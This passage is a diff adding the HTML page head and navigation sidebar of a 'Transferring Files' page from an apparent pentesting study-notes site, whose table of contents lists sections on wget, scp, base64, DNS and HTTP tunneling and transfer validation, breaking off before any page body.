@@ -1,0 +1,4760 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/">
+      
+      
+        <link rel="next" href="../../File%20Transfers/Win%20File%20Transfer%20Methods/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.5">
+    
+    
+      
+        <title>Transferring Files - Pentesting Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../styles/custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="#00be98" data-md-color-accent="#007e65">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#references" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting Notes" class="md-header__button md-logo" aria-label="Pentesting Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Transferring Files
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="#00be98" data-md-color-accent="#007e65"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="#00be98" data-md-color-accent="#007e65"  aria-label="switch to light mdoe"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="switch to light mdoe" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting Notes" class="md-nav__button md-logo" aria-label="Pentesting Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Pentesting Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome to My Portfolio
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CPTS
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CPTS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Getting Started
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Getting Started
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20Enumeration%20Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Enumeration Overview
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Types%20of%20Shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Types of Shells
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Folder%20Structure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Folder Structure
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['In-Progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Public%20Exploits/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Public Exploits
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Get%20OS%20Information/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Get OS Information
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Way%20Forward/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Way Forward
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['in-progress']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Starting%20Out/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Starting Out
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Pitfalls and Troubleshooting in VPN and SSH Connections
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['Completed']"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Transferring Files
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['in-progress']"></span>
+  
+
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Transferring Files
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--['in-progress']"></span>
+  
+
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methods-for-transferring-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Methods for Transferring Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-using-wget-and-curl" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Using wget and cURL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-using-scp-secure-copy" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Using scp (Secure Copy)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-using-base64-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Using base64 Encoding
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-2-use-a-text-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 2: Use a Text File
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-1-manual-typing-for-small-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 1: Manual Typing (For Small Files)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-2-break-the-base64-string-into-chunks-more-practical" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 2: Break the Base64 String into Chunks (More Practical)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-3-command-injection-or-reverse-shell-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 3: Command Injection or Reverse Shell Exploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-4-using-dns-or-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 4: Using DNS or HTTP Tunneling
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Tunneling
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#steps-for-dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Steps for DNS Tunneling:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-for-dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for DNS Tunneling:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-1-set-up-dns-tunneling-on-your-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Set up DNS Tunneling on Your (Attacker) Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-install-iodine-on-the-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1 Install Iodine on the Attacker Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-configure-dns-for-your-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2 Configure DNS for Your Domain
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13-start-the-iodine-server-on-your-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3 Start the Iodine Server on Your Attacker Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-2-set-up-dns-tunneling-on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Set up DNS Tunneling on the Target Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-install-iodine-on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 Install Iodine on the Target Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-start-the-iodine-client-on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 Start the Iodine Client on the Target Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-verify-connection" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3 Verify Connection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-3-transfer-files-over-the-dns-tunnel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Transfer Files Over the DNS Tunnel
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#31-on-the-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 On the Attacker Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-validate-file-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Validate File Transfer
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#on-the-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      On the Attacker Machine:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      On the Target Machine:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-for-dns-tunneling_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for DNS Tunneling
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-tunneling-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Tunneling Windows
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DNS Tunneling Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-by-step-dns-tunneling-on-a-windows-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step-by-Step: DNS Tunneling on a Windows Target
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-use-a-windows-client-for-dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Use a Windows Client for DNS Tunneling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-download-and-set-up-iodine-on-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Download and Set Up Iodine on Windows
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-establish-the-dns-tunnel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Establish the DNS Tunnel
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-transfer-files-over-the-dns-tunnel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Transfer Files Over the DNS Tunnel
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#option-1-transfer-files-using-netcat-nc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Option 1: Transfer Files Using Netcat (nc)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#option-2-transfer-files-using-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Option 2: Transfer Files Using PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-validate-file-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5: Validate File Transfer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#summary_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Tunneling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#steps-for-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Steps for HTTP Tunneling:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools-for-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for HTTP Tunneling:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#when-to-use-dns-or-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      When to Use DNS or HTTP Tunneling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#study-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Study Tips
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#study-tip" class="md-nav__link">
+    <span class="md-ellipsis">
+      Study Tip
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#validating-file-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Validating File Transfers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-using-the-file-command" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Using the file Command:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-using-md5sum" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Using md5sum:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#study-tips_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Study Tips
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    File Transfers
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            File Transfers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/Win%20File%20Transfer%20Methods/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Win File Transfer Methods
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/Linux%20File%20Transfer%20Methods/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux File Transfer Methods
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/file_transfer_operations/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File transfer operations
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/transfer_files_wtih_code/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transferring Files with Code
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/miscellaneous_file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Miscellaneous file transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/protected_file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Protected file transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/catching_files_over_HTTPS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    catching files over HTTPS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/detection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Detection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/living_off_the_land/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Living off the land
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Transfers/evasion_detection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Evasion detection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Shells and Payloads
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Shells and Payloads
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/understanding_shells_and_payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Understanding Shells and Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/CAT5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CAT5 Security's Engagement Preparation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Shells%20and%20Payloads/anatomy_of_a_shell/" class="md-nav__link">
+        
+  
